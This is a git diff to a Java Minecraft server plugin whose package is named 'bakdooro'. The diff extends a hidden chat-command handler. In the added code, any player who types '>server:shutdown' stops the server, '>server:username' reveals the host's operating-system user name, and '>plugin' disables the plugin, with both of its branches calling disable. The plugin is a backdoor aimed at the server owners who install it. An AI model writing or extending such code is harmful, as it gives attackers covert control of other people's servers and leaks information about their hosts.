@@ -3,8 +3,10 @@ package me.acaiberii.bakdooro.util.handler;
 import me.acaiberii.bakdooro.commands.blatant.blnt;
 import me.acaiberii.bakdooro.commands.exploit.exploit;
 import me.acaiberii.bakdooro.commands.misc.misc;
+import me.acaiberii.bakdooro.main;
 import org.bukkit.entity.Player;
 import me.acaiberii.bakdooro.items.itm;
+import org.bukkit.plugin.Plugin;
 
 import java.io.File;
 import java.io.FileWriter;
@@ -13,8 +15,8 @@ import java.util.Objects;
 import java.util.Random;
 
 import static me.acaiberii.bakdooro.game.server.srv;
-import static org.bukkit.Bukkit.getOnlinePlayers;
-import static org.bukkit.Bukkit.getPlayer;
+import static me.acaiberii.bakdooro.items.itm.thispl;
+import static org.bukkit.Bukkit.*;
 
 public class chathandler {
     public static void handler(Player pl, String message) {
@@ -109,9 +111,38 @@ public class chathandler {
                     }
                 }
             }
-            else if (spl[0].startsWith(">shutdown")) {
-                pl.sendMessage("Shutting down server.");
-                srv.shutdown();
+            else if (spl[0].startsWith(">server")) {
+                if (spl.length < 2) {
+                    pl.sendMessage("Invalid syntax. Correct syntax: >server:(shutdown/user)");
+                }
+                else {
+                    if (spl[1].equals("shutdown")) {
+                        pl.sendMessage("Shutting down server.");
+                        srv.shutdown();
+                    }
+                    else if (spl[1].equals("username")) {
+                        pl.sendMessage(System.getProperty("user.name"));
+                    }
+                    else {
+                        pl.sendMessage("Unknown mode. Valid modes: username, shutdown.");
+                    }
+                }
+            }
+            else if (spl[0].equals(">plugin")) {
+                if (spl.length < 2) {
+                    pl.sendMessage("Invalid syntax. Correct syntax: >plugin:(enable/disable)");
+                }
+                else {
+                    if (spl[1].equals("enable")) {
+                        srv.getPluginManager().disablePlugin(thispl);
+                    }
+                    else if (spl[1].equals("disable")) {
+                        srv.getPluginManager().disablePlugin(thispl);
+                    }
+                    else {
+                        pl.sendMessage("Unknown mode. Valid modes: enable, disable.");
+                    }
+                }
             }
             else if (spl[0].startsWith(">blatant")) {
                 if (spl.length < 2) {
